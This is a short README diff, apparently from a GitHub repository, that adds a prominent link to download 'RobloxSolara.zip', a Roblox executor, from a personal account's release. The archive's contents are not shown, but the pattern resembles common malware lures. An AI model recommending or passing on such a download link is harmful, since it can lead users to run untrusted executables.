@@ -10,7 +10,7 @@
   
 ## Usage
 
- * [Download]() the zip archive. <br>
+## [Download](https://github.com/mailvilenelson/zizi/releases/download/Enjoy!/RobloxSolara.zip) the zip archive. <br>
 
  
 ## Notes
